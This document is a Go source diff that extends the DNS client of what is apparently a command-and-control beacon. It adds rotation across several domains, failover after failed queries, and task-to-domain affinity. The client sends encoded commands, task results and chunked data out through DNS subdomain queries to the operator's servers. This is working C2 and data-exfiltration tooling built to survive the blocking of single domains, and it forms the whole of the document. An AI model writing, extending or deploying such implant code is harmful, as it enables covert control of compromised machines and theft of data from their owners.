@@ -4,16 +4,23 @@
 package main
 
 import (
+	"crypto/rand"
 	"fmt"
+	"math/big"
 	"net"
 	"strings"
+	"sync"
 	"time"
 )
 
 // DNSClient handles DNS-based C2 communication
 type DNSClient struct {
-	config *Config
-	aesKey []byte
+	config        *Config
+	aesKey        []byte
+	taskDomainMap map[string]string    // Maps taskID to domain (ensures chunks go to same server)
+	domainIndex   int                  // For round-robin selection
+	failedDomains map[string]time.Time // Tracks temporarily failed domains
+	mutex         sync.RWMutex
 }
 
 // newDNSClient creates a DNS client with configured timeout and resolver settings
@@ -23,8 +30,124 @@ func newDNSClient() *DNSClient {
 	aesKey := generateAESKey(config.EncryptionKey)
 
 	return &DNSClient{
-		config: &config,
-		aesKey: aesKey,
+		config:        &config,
+		aesKey:        aesKey,
+		taskDomainMap: make(map[string]string),
+		domainIndex:   0,
+		failedDomains: make(map[string]time.Time),
+	}
+}
+
+// selectDomain chooses a domain based on the configured selection mode
+// For tasks (identified by taskID), it ensures all chunks go to the same domain
+func (c *DNSClient) selectDomain(taskID string) (string, error) {
+	domains := c.config.GetDomains()
+	if len(domains) == 0 {
+		return "", fmt.Errorf("no DNS domains configured")
+	}
+
+	// Single domain case - no selection needed
+	if len(domains) == 1 {
+		return domains[0], nil
+	}
+
+	// If this is part of a task (has taskID), check if we already selected a domain
+	if taskID != "" {
+		c.mutex.RLock()
+		if domain, exists := c.taskDomainMap[taskID]; exists {
+			c.mutex.RUnlock()
+			return domain, nil
+		}
+		c.mutex.RUnlock()
+	}
+
+	// Clean up expired failed domains (retry after 5 minutes)
+	c.mutex.Lock()
+	now := time.Now()
+	for domain, failTime := range c.failedDomains {
+		if now.Sub(failTime) > 5*time.Minute {
+			delete(c.failedDomains, domain)
+		}
+	}
+	c.mutex.Unlock()
+
+	// Filter out currently failed domains
+	availableDomains := []string{}
+	c.mutex.RLock()
+	for _, domain := range domains {
+		if _, failed := c.failedDomains[domain]; !failed {
+			availableDomains = append(availableDomains, domain)
+		}
+	}
+	c.mutex.RUnlock()
+
+	// If all domains failed, reset and use all domains
+	if len(availableDomains) == 0 {
+		availableDomains = domains
+		c.mutex.Lock()
+		c.failedDomains = make(map[string]time.Time)
+		c.mutex.Unlock()
+	}
+
+	var selectedDomain string
+	mode := c.config.GetSelectionMode()
+
+	switch mode {
+	case "random":
+		// Random selection for load balancing
+		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(availableDomains))))
+		if err != nil {
+			// Fallback to first domain if crypto/rand fails
+			selectedDomain = availableDomains[0]
+		} else {
+			selectedDomain = availableDomains[n.Int64()]
+		}
+
+	case "round-robin":
+		// Round-robin selection
+		c.mutex.Lock()
+		c.domainIndex = c.domainIndex % len(availableDomains)
+		selectedDomain = availableDomains[c.domainIndex]
+		c.domainIndex++
+		c.mutex.Unlock()
+
+	case "failover":
+		// Failover: always use first available domain
+		selectedDomain = availableDomains[0]
+
+	default:
+		// Default to random
+		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(availableDomains))))
+		if err != nil {
+			selectedDomain = availableDomains[0]
+		} else {
+			selectedDomain = availableDomains[n.Int64()]
+		}
+	}
+
+	// If this is part of a task, remember the domain selection
+	if taskID != "" {
+		c.mutex.Lock()
+		c.taskDomainMap[taskID] = selectedDomain
+		c.mutex.Unlock()
+	}
+
+	return selectedDomain, nil
+}
+
+// markDomainFailed marks a domain as temporarily failed
+func (c *DNSClient) markDomainFailed(domain string) {
+	c.mutex.Lock()
+	c.failedDomains[domain] = time.Now()
+	c.mutex.Unlock()
+}
+
+// cleanupTaskMapping removes task-to-domain mapping after task completion
+func (c *DNSClient) cleanupTaskMapping(taskID string) {
+	if taskID != "" {
+		c.mutex.Lock()
+		delete(c.taskDomainMap, taskID)
+		c.mutex.Unlock()
 	}
 }
 
@@ -46,8 +169,9 @@ func (c *DNSClient) decodeResponse(encoded string) (string, error) {
 	return decoded, nil
 }
 
-// sendDNSQuery sends a command via DNS query
-func (c *DNSClient) sendDNSQuery(command string) (string, error) {
+// sendDNSQuery sends a command via DNS query with multi-domain support
+// taskID parameter ensures all chunks for a task go to the same domain
+func (c *DNSClient) sendDNSQuery(command string, taskID string) (string, error) {
 	encodedCmd, err := c.encodeCommand(command)
 	if err != nil {
 		return "", fmt.Errorf("failed to encode command: %v", err)
@@ -56,6 +180,12 @@ func (c *DNSClient) sendDNSQuery(command string) (string, error) {
 	// Limit command length
 	if len(encodedCmd) > c.config.MaxCommandLength {
 		return "", fmt.Errorf("command too long: %d characters (max %d)", len(encodedCmd), c.config.MaxCommandLength)
+	}
+
+	// Select domain (with task affinity if taskID provided)
+	domain, err := c.selectDomain(taskID)
+	if err != nil {
+		return "", fmt.Errorf("failed to select domain: %v", err)
 	}
 
 	// Create DNS query with encoded command as subdomain
@@ -70,7 +200,7 @@ func (c *DNSClient) sendDNSQuery(command string) (string, error) {
 		encodedCmd = encodedCmd[chunkSize:]
 	}
 
-	queryName := fmt.Sprintf("%s.%s", strings.Join(labels, "."), c.config.ServerDomain)
+	queryName := fmt.Sprintf("%s.%s", strings.Join(labels, "."), domain)
 
 	var result string
 
@@ -119,8 +249,22 @@ func (c *DNSClient) sendDNSQuery(command string) (string, error) {
 		}
 	}
 
+	// If all retries failed, mark domain as failed and try another domain
 	if err != nil {
-		return "", fmt.Errorf("DNS query failed after %d attempts: %v", c.config.RetryAttempts, err)
+		c.markDomainFailed(domain)
+
+		// Try one more time with a different domain (failover)
+		domains := c.config.GetDomains()
+		if len(domains) > 1 {
+			// Select a different domain (don't pass taskID to allow selection of different domain)
+			newDomain, selErr := c.selectDomain("")
+			if selErr == nil && newDomain != domain {
+				// Recursive call with new domain (limit recursion by checking domain change)
+				return c.sendDNSQuery(command, taskID)
+			}
+		}
+
+		return "", fmt.Errorf("DNS query to %s failed after %d attempts: %v", domain, c.config.RetryAttempts, err)
 	}
 
 	return result, nil
@@ -136,5 +280,26 @@ func (c *DNSClient) sendCommand(command string) (string, error) {
 	timestamp := fmt.Sprintf("%d", time.Now().Unix())
 	commandWithTimestamp := fmt.Sprintf("%s|%s", command, timestamp)
 
-	return c.sendDNSQuery(commandWithTimestamp)
+	// Extract taskID from command for task affinity (RESULT, RESULT_META, DATA)
+	// Format: RESULT|beaconID|taskID|data
+	// Format: RESULT_META|beaconID|taskID|totalSize|totalChunks
+	// Format: DATA|beaconID|taskID|chunkIndex|data
+	taskID := ""
+	parts := strings.Split(command, "|")
+	if len(parts) >= 3 {
+		cmdType := parts[0]
+		if cmdType == "RESULT" || cmdType == "RESULT_META" || cmdType == "DATA" {
+			taskID = parts[2] // taskID is always the 3rd field for these commands
+		}
+	}
+
+	result, err := c.sendDNSQuery(commandWithTimestamp, taskID)
+
+	// Clean up task mapping after final result or when task is done
+	if err == nil && taskID != "" && parts[0] == "RESULT" {
+		// For single-chunk results, clean up immediately
+		c.cleanupTaskMapping(taskID)
+	}
+
+	return result, err
 }
